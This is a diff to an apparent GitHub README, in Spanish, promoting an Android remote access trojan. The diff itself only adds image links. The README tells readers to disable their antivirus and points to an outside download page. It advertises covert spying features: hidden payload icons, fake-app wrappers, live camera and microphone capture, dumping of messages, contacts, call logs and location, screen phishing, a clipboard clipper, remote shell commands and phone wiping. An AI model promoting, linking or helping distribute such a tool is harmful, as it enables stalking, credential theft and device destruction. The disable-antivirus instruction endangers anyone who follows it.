@@ -1,6 +1,7 @@
 # ANROID-SPY-RAT
 AndroidRat:DESACTIVAR EL ANTIVIRUS
 Descargar: https://nibiruanuna.wixsite.com/android-rat-spy
+![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/SPYRAT2023/ANROID-SPY-RAT/assets/133964447/340ff224-b250-4e26-b58d-e2a81a74aa9f)
 
 230733598-9f8f2107-a1fd-47bd-944b-fbc079c23335
 
@@ -15,6 +16,7 @@ Descargar: https://nibiruanuna.wixsite.com/android-rat-spy
 ⭐️El constructor agrega mas opciones de aplicaciones falsas
 
 ⭐️Mostrar si el dispositivo es administrador 68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067 Disponible para rata: https://nibiruanuna.wixsite.com/android-rat-spy
+![230733598-9f8f2107-a1fd-47bd-944b-fbc079c23335](https://github.com/SPYRAT2023/ANROID-SPY-RAT/assets/133964447/64c7c0e5-0af9-459c-b6a8-5ee7c8c7c72c)
 
 Anti-Borrado Control de pantalla Formatear teléfono Llamada telefónica mensajera tostadora Administrador de archivos Phisher de pantalla Información del sistema de volcado Ubicación de volcado Transmisión de cámara web en vivo Mensajes de volcado Cambiar el modo de audio Volcar registros de llamadas Volcar la hora local Grabación de micrófono Desinstalar aplicación Lista de aplicaciones instaladas Enviar mensaje Volcar contactos Pantalla de bloqueo/desbloqueo Ejecutar de shell comando Instantánea de la cámara web Abre la app Instalar aplicación Información del dispositivo Ocultar/Mostrar el icono de la aplicación de carga útil
 
@@ -24,6 +26,7 @@ Control de pantalla más rápido Control desde el navegador web Android Clipper 
 
 Acerca de
 androidrat
+![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/SPYRAT2023/ANROID-SPY-RAT/assets/133964447/1edf9423-ad21-4e87-9d7b-59d362eff51e)
 
 Temas
 Recursos
